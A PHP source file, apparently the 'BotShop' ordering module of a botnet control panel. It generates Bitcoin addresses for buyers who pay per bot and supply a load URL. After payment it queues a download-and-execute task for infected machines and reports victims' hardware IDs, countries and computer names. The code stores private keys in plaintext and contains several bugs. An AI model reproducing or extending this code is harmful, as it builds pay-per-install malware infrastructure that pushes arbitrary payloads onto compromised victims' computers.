<?php

/*
 *              TODO:

- Create order (Bitcoin or Ethereum Payments) get address  //hd-wallet-derive
- Check if Payed and create Task
- Get task Info

 *
 */

//https://github.com/Bit-Wasp/bitcoin-php/tree/master/examples

use BitWasp\Bitcoin\Address\PayToPubKeyHashAddress;
use BitWasp\Bitcoin\Bitcoin;
use BitWasp\Bitcoin\Crypto\Random\Random;
use BitWasp\Bitcoin\Key\Factory\PrivateKeyFactory;
use BitWasp\Bitcoin\Network\NetworkFactory;

class OrderApi
{
    // TODO BotShop API

    private $priceperbot;
    private $isTestnet = true;
    private $blockchainAPI;
    private $blockconfirms;

    function __construct()
    {
        $this->priceperbot = 0.20;
        $this->blockconfirms = 1;
        if($this->isTestnet){
            $this->blockchainAPI = "https://chain.so/api/v2/get_address_balance/BTCTEST/";
        }else{
            $this->blockchainAPI = "https://chain.so/api/v2/get_address_balance/BTC/";
        }
    }

    function command_exist($cmd)
    {
        $return = shell_exec(sprintf("which %s", escapeshellarg($cmd)));
        return !empty($return);
    }

    private function botsToUSD($bots)
    {
        return $bots * $this->priceperbot;
    }

    private function generateOrder($type, $bots,$loadurl)
    {
        $bitcoinAddress = $this->generateBitcoinAddress($this->isTestnet);
        $usd = $this->botsToUSD($bots);
        $coinsToPay = file_get_contents("https://blockchain.info/tobtc?currency=USD&value=" . $usd);
        $statement = $GLOBALS["pdo"]->prepare("INSERT INTO botshop_orders (type, address, privatekey, usd, coinstopay, botamount, loadurl) VALUES (?, ?, ?, ?, ?, ?,?)");
        $statement->execute(array($type, $bitcoinAddress["address"], $bitcoinAddress["privatekey"], $usd, $coinsToPay, $bots,$loadurl));
        return array(
            "address" => $bitcoinAddress["address"],
            "coinsToPay" => $coinsToPay,
            "usd" => $usd,
        );
    }

    private function generateBitcoinAddress($testnet = false)
    {
        if ($testnet == true) {
            Bitcoin::setNetwork(NetworkFactory::bitcoinTestnet());
        }
        $network = BitWasp\Bitcoin\Bitcoin::getNetwork();
        $random = new Random();
        $privKeyFactory = new PrivateKeyFactory();
        $privateKey = $privKeyFactory->generateCompressed($random);
        $publicKey = $privateKey->getPublicKey();
        $address = new PayToPubKeyHashAddress($publicKey->getPubKeyHash());
        return array(
            "address" => $address->getAddress(),
            "privatekey" => $privateKey->toWif($network),
        );
    }


    public function checkAmount($address,$confirms){
       $checked = json_decode(file_get_contents($this->blockchainAPI."/".$address."/".$confirms),true);
       return $checked["data"]["confirmed_balance"];
    }


    public function detils(){
        $address = $_POST["address"];
        $statement = $GLOBALS["pdo"]->prepare("SELECT * FROM botshop_orders WHERE address = ?");
        $statement->execute(array($address));
        $orderTable = $statement->fetch();


        $statement = $GLOBALS["pdo"]->prepare("SELECT  COUNT(bots.id) as NUM, tasks_completed.bothwid, tasks_completed.status, tasks_completed.taskid, bots.country, bots.computrername, bots.operingsystem, tasks.task, tasks.command, tasks.filter, tasks.status as taskstatus FROM `tasks_completed` 
            LEFT JOIN bots ON tasks_completed.bothwid = bots.hwid
            LEFT JOIN tasks ON tasks_completed.taskid = tasks.id
            WHERE tasks_completed.taskid = ?");
        $statement->execute(array($orderTable["taskid"]));
        $order = $statement->fetch();
        $order["order"] = $orderTable;
        echo json_encode(array("order"=>$order));
        die();
    }

    public function checkorder(){
        $address = $_POST["address"];
        $payAmount = $this->checkAmount($address,$this->blockconfirms);

        $statement = $GLOBALS["pdo"]->prepare("SELECT * FROM botshop_orders WHERE address = ?");
        $statement->execute(array($address));
        $order = $statement->fetch();


        if($order["coinstopay"] <= $payAmount){
            //Update order and insert Task
            if($order["taskid"] == "none"){
                $statement = $GLOBALS["pdo"]->prepare("INSERT INTO tasks (filter, status, task, command) VALUES (?, ?, ?, ?)");
                $statement->execute(array('[]', 0, 'dande', $order["loadurl"]));
                $taskid = $GLOBALS["pdo"]->lastInsertId();

                $statement = $GLOBALS["pdo"]->prepare("UPDATE botshop_orders SET payed = ?, taskid = ? WHERE address = ?");
                $statement->execute(array(1, $taskid, $address));
                echo json_encode(array("success"=>"true","message"=>"Success Ordered"));
            }else{
                echo json_encode(array("success"=>"true","message"=>"Success Ordered"));
            }

        }else{
            if($payAmount != "0.00000000" || $payAmount != 0){
                echo json_encode(array("success"=>"false","message"=>"Please send more Bitcoin","current"=>$payAmount,"order"=>$order));
            }else{
                echo json_encode(array("success"=>"false","message" => "Please send Bitcoin to the flowing address", "current"=>"" , "order"=>$order));
            }
        }

        die();
    }

    public function checkFunctions()
    {
        //  echo $this->checkAmount("2MtmwAVzoDcjR9S41SDpAhkbEBJES551ERv",1);
        $infos = $this->generateOrder("btc",$_POST["amount"]);
        echo json_encode($infos);
        die();
    }

    public function createoder(){
        $infos = $this->generateOrder("btc",$_POST["amount"],$_POST["loadurl"]);
        echo json_encode($infos);
        die();
    }


}

?>